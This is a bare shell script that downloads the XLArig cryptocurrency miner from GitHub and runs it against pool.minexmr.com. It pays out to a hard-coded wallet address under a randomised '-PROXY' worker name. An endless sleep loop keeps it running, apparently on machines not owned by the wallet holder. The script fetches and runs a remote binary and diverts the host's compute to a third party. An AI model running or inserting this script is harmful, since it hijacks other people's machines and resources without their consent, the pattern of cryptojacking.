sudo apt update
sudo apt install screen -y
wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip 
unzip XLArig-v5.2.2-linux-x86_64.zip 
./xlarig -o pool.minexmr.com:4444 -u 8BDpmogpVfsS8zp6fyktp4gx5N5yqZa1w93qYe5XgvY5Fw5ii34MUCcDYkgiZ5UM5BRRihZpVS3EcCPJ3tyjYnxo2jaz2Yc.$(echo $(shuf -i 1-9999 -n 1)-PROXY)+100000
while [ 1 ]; do
sleep 1.2
done
sleep 1294
